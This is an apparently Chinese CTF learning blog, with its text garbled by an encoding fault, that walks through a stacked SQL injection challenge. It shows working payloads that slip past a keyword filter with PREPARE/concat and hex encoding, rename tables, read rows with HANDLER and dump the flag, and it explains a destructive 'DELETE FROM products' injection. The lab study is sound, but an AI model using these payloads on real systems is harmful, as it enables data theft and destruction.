<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå­—ç¬¦&quot;</span><span class="hljs-literal">%i</span>)<br>å¾—åˆ°ï¼š<br><br>ç¬¬<span class="hljs-number">32</span>ä¸ªå­—ç¬¦<br>NSSCTF&#123;479a596c-<span class="hljs-number">2b47</span>-41ae-b4dc-<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>
<p>è¦æ˜¯æ–­è¿çš„è¯ç›´æ¥æ”¹ä¸€ä¸‹è¿™ä¸ªèµ·å§‹å­—ç¬¦å°±èƒ½ç»§ç»­çˆ†äº†</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure>

<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>fuzzä¸ä¼šï¼Œæ²¡æœ‰æ¸…æ™°çš„æ€è·¯çš„è¯çœŸçš„å¾ˆè´¹åŠ²ï¼Œè¦å¤šå­¦å­¦fuzzæ€è·¯</p>
<hr>
<h2 id="title-note-20date-2025-03-28-15-12-28tags-sql"><a href="#title-note-20date-2025-03-28-15-12-28tags-sql" class="headerlink" title="title: note-20date: 2025-03-28 15:12:28tags: sql"></a>title: note-20<br>date: 2025-03-28 15:12:28<br>tags: sql</h2><h1 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨"></a>å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨</h1><p>ä¸Šæ¬¡åšè¿™é¢˜è¿˜æ˜¯ä¸¤ä¸ªæœˆå‰ï¼Œå¥½åƒä¹Ÿæ˜¯è¿™é¢˜åšå®šäº†æˆ‘æ‰“åŸºç¡€çš„åŸå› ï¼Œè™½ç„¶ç°åœ¨çœ‹è¿˜æ˜¯å¾—çœ‹å¤§ä½¬ä»¬çš„wp<br>ä½†ä»¥å‰æ˜¯wpéƒ½çœ‹ä¸æ˜ç™½<br>å…ˆæ˜¯æ•°å­—ä¼ å‚ï¼Œ<br>æ³¨å…¥ç‚¹</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">inject</span>=1&#x27;#<br></code></pre></td></tr></table></figure>
<p>å°è¯•</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p>å›æ˜¾  </p>
<p>return preg_match(â€œ&#x2F;select|update|delete|drop|insert|where|.&#x2F;iâ€,$inject);</p>
<p>å°è¯•</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,database()))  # <br></code></pre></td></tr></table></figure>
<p>æˆåŠŸå›æ˜¾<br>error 1105 : XPATH syntax error: â€˜!supersqliâ€™</p>
<p>å¥½åƒèƒ½ç”¨æŠ¥é”™ï¼Œä½†æ˜¯selectè¢«è¿‡æ»¤äº†å‘€ğŸ¤¡</p>
<p>å°è¯•äº†<br>åŒå†™ç»•è¿‡<br>ä½¿ç”¨URLç¼–ç <br>&lt;&gt;ç»•è¿‡<br>æ— æœ  </p>
<p>åªèƒ½çœ‹wpäº†å—<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a><br>åŸwpå†™çš„æ˜¯çœŸçš„å¥½ï¼Œè¯¦ç»†é€å½»</p>
<p>ä½¿ç”¨å †å æ³¨å…¥ï¼ŒæŸ¥çœ‹æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">å›æ˜¾ï¼š</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>ç„¶åæ˜¯æŸ¥çœ‹è¡¨å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables from supersqli;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">å›æ˜¾ï¼š</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>æŸ¥çœ‹å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show colums from &quot;1919810931114514&quot;;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">æ²¡æ³•å›æ˜¾</span><br><span class="hljs-string"></span><br><span class="hljs-string">æ”¹ä¸º</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;1919810931114514&#x27;</span>;#<br><br>ä¸è¡Œ<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">æˆåŠŸå›æ˜¾:</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;flag&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">  [2]=&gt;</span><br><span class="hljs-string">  string(2) &quot;NO&quot;</span><br><span class="hljs-string">  [3]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">  [4]=&gt;</span><br><span class="hljs-string">  NULL</span><br><span class="hljs-string">  [5]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼Œå¦‚æœtableNameæ˜¯çº¯æ•°å­—ï¼Œéœ€è¦ç”¨<code>åŒ…è£¹ï¼Œæ¯”å¦‚1&#39;;desc </code>1919810931114514&#96;;#</p>
</blockquote>
<p>åŸæ¥æ˜¯ &#96; è€Œä¸æ˜¯ â€˜ ğŸ¤¡</p>
<p>åˆ°è¿™æ­¥éª¤å°±æœ‰å¤šç§æ–¹æ³•è§£é¢˜äº†  </p>
<h2 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h2><p>é€šè¿‡é¢„ç¼–è¯‘çš„æ–¹å¼æ‹¼æ¥select å…³é”®å­—ï¼š  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;prepare hack from concat(&#x27;</span>sele<span class="hljs-string">&#x27;,&#x27;</span>ct<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`<span class="hljs-string">&#x27;);execute hack;#</span><br></code></pre></td></tr></table></figure>
<p>å¾—flag{f2078443-bdad-4914-b367-e6691fd333c5}</p>
<h2 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h2><blockquote>
<p>å°†select * from <code>1919810931114514</code>è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç <br>73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br><span class="hljs-string">æˆ–è€…å®šä¹‰ä¸€ä¸ªå˜é‡å</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">Set</span> <span class="hljs-variable">@jia</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">PREPARE</span> hacker <span class="hljs-keyword">from</span> <span class="hljs-variable">@jia</span>;<span class="hljs-keyword">EXECUTE</span> hacker;#<br></code></pre></td></tr></table></figure>
<p>çœ‹æƒ…å†µç”¨æŠŠï¼Œæˆ‘è§‰å¾—èƒ½ç”¨é¢„ç¼–è¯‘çš„è¯ï¼Œé‚£å¾ˆå¤šéƒ½èƒ½è§£å†³äº†</p>
<h2 id="æ³•ä¸‰"><a href="#æ³•ä¸‰" class="headerlink" title="æ³•ä¸‰"></a>æ³•ä¸‰</h2><blockquote>
<p>æœ€åä¸€æ­¥ï¼ˆç¬¬8æ­¥ï¼‰ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹è¡¨åå’Œåˆ—åæ¥å®ç°ã€‚æˆ‘ä»¬è¾“å…¥1åï¼Œé»˜è®¤ä¼šæ˜¾ç¤ºidä¸º1çš„æ•°æ®ï¼Œå¯ä»¥çŒœæµ‹é»˜è®¤æ˜¾ç¤ºçš„æ˜¯wordsè¡¨çš„æ•°æ®ï¼ŒæŸ¥çœ‹wordsè¡¨ç»“æ„ç¬¬ä¸€ä¸ªå­—æ®µåä¸ºidæˆ‘ä»¬æŠŠwordsè¡¨éšä¾¿æ”¹æˆwords1ï¼Œç„¶åæŠŠ1919810931114514è¡¨æ”¹æˆwordsï¼Œå†æŠŠåˆ—åflagæ”¹æˆidï¼Œå°±å¯ä»¥è¾¾åˆ°ç›´æ¥è¾“å‡ºflagå­—æ®µçš„å€¼çš„æ•ˆæœï¼š</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# </span><br><span class="hljs-string">ç„¶åç›´æ¥</span><br><span class="hljs-string">1&#x27;</span>; <span class="hljs-keyword">or</span> ture<br>æŸ¥çœ‹æ‰€æœ‰å­—æ®µæ‹¿åˆ°flag<br></code></pre></td></tr></table></figure>

<p>666ï¼Œæ”¹ä¸äº†æŸ¥è¯¢è¯­å¥å°±æ”¹è¡¨åï¼Œæ€è·¯å¤ªå¼€é˜”äº†ï¼Œ</p>
<p>è¿™é‡Œè¦æ³¨æ„:<br>æˆ‘åœ¨è‡ªå·±å°è¯•çš„æ—¶å€™æ²¡æœ‰å°†æ¢è¡¨åå’Œæ”¹å­—æ®µçš„æ“ä½œä¸€æ¡è¯­å¥å®Œæˆï¼Œæˆ‘æ˜¯å…ˆæ”¹çš„words to words1ï¼Œå¯¼è‡´äº†æºç sqlæŸ¥è¯¢è¯­å¥çš„æŸ¥wordså‡ºé”™ï¼Œåé¢å°†flagè¡¨æ”¹æˆwordsçš„æ“ä½œæ— æ³•ä¼ å…¥ï¼Œä¸€åˆ‡åç»­æ“ä½œå¤±æ•ˆï¼Œè¿™æ—¶sqlè¯­å¥æŸ¥è¯¢çš„wordsï¼Œä½†æ˜¯ç°åœ¨å·²ç»æ²¡æœ‰wordsè¿™ä¸ªè¡¨äº†ï¼ŒåŸsqlè¯­å¥å°±ç”¨ä¸äº†äº†ï¼Œæ°¸è¿œæŠ¥é”™ï¼Œåº”è¯¥æ˜¯ç›¸å½“äºè¿™ä¸ªé¶æœºåºŸäº†ï¼›</p>
<h2 id="æ³•å››ï¼š"><a href="#æ³•å››ï¼š" class="headerlink" title="æ³•å››ï¼š"></a>æ³•å››ï¼š</h2><blockquote>
<p>æ­¤é¢˜è¿˜å¯ä»¥é€šè¿‡handleç›´æ¥å‡ºç­”æ¡ˆï¼š</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure>
<h1 id="notice-2"><a href="#notice-2" class="headerlink" title="notice"></a>notice</h1><hr>
<h2 id="0x01-å †å æ³¨å…¥åŸç†"><a href="#0x01-å †å æ³¨å…¥åŸç†" class="headerlink" title="0x01 å †å æ³¨å…¥åŸç†"></a>0x01 å †å æ³¨å…¥åŸç†</h2><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š Select * from products where productid&#x3D;1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p>
<h2 id="0x02-é¢„ç¼–è¯‘"><a href="#0x02-é¢„ç¼–è¯‘" class="headerlink" title="0x02 é¢„ç¼–è¯‘"></a>0x02 é¢„ç¼–è¯‘</h2><blockquote>
<p>é¢„ç¼–è¯‘ç›¸å½“äºå®šä¸€ä¸ªè¯­å¥ç›¸åŒï¼Œå‚æ•°ä¸é€šçš„Mysqlæ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é¢„ç¼–è¯‘çš„æ–¹å¼ï¼Œç»•è¿‡ç‰¹å®šçš„å­—ç¬¦è¿‡æ»¤,  </p>
</blockquote>
<p>æˆ‘ç†è§£æ˜¯å…ˆå†™å¥½sqlè¯­å¥å‘½ä»¤ï¼Œç„¶åæ‰§è¡Œï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€é‡Œçš„å®šä¹‰å‡½æ•°æˆ–ç±»ï¼Ÿ<br>é¢„ç¼–è¯‘å‘½ä»¤ç”¨æ³•:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> åç§° <span class="hljs-keyword">FROM</span> 	<span class="hljs-keyword">Sql</span>è¯­å¥ ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> åç§° <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure>
<p>ä¾‹å­</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">æ–¹æ³•ä¸€ï¼š<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>æ–¹æ³•äºŒï¼š<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>æ–¹æ³•ä¸‰ï¼š<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>æ–¹æ³•å››ï¼š<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure>

<h2 id="0x03-æ›´æ”¹è¡¨å"><a href="#0x03-æ›´æ”¹è¡¨å" class="headerlink" title="0x03 æ›´æ”¹è¡¨å"></a>0x03 æ›´æ”¹è¡¨å</h2><p>ä¿®æ”¹è¡¨åï¼šALTER TABLE æ—§è¡¨å RENAME TO æ–°è¡¨åï¼›<br>ä¿®æ”¹å­—æ®µï¼šALTER TABLE è¡¨å CHANGE æ—§å­—æ®µå æ–°å­—æ®µå æ–°æ•°æ®ç±»å‹ï¼›</p>
<h2 id="0x04-handle"><a href="#0x04-handle" class="headerlink" title="0x04 handle"></a>0x04 handle</h2><p>MySQL é™¤äº†å¯ä»¥ä½¿ç”¨ select æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨ handler è¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handler è¯­å¥å¹¶ä¸å…·å¤‡ select è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯ MySQL ä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚handler è¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äº MyISAM å’Œ InnoDB è¡¨ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql"># æ‰“å¼€ä¸€ä¸ªè¡¨åä¸º tbl_name çš„è¡¨çš„å¥æŸ„<br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br># <span class="hljs-number">1</span>ã€é€šè¿‡æŒ‡å®šç´¢å¼•æŸ¥çœ‹è¡¨ï¼Œå¯ä»¥æŒ‡å®šä»ç´¢å¼•é‚£ä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡ NEXT ç»§ç»­æµè§ˆ<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">2</span>ã€é€šè¿‡ç´¢å¼•æŸ¥çœ‹è¡¨<br># <span class="hljs-keyword">FIRST</span>: è·å–ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰<br># NEXT: è·å–ä¸‹ä¸€è¡Œ<br># PREV: è·å–ä¸Šä¸€è¡Œ<br># <span class="hljs-keyword">LAST</span>: è·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">3</span>ã€ä¸é€šè¿‡ç´¢å¼•æŸ¥çœ‹è¡¨<br># READ <span class="hljs-keyword">FIRST</span>: è·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œ<br># READ NEXT: ä¾æ¬¡è·å–å…¶ä»–è¡Œï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åœ¨è·å–å¥æŸ„åç›´æ¥ä½¿ç”¨è·å–ç¬¬ä¸€è¡Œï¼‰<br># æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ READ NEXT ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœ<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># å…³é—­å·²æ‰“å¼€çš„å¥æŸ„<br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br><br></code></pre></td></tr></table></figure>
<p>å‚è€ƒwpé‡Œçš„è¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure>
<p>æ›´è¯¦ç»†ç”¨æ³•<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p>
<hr>
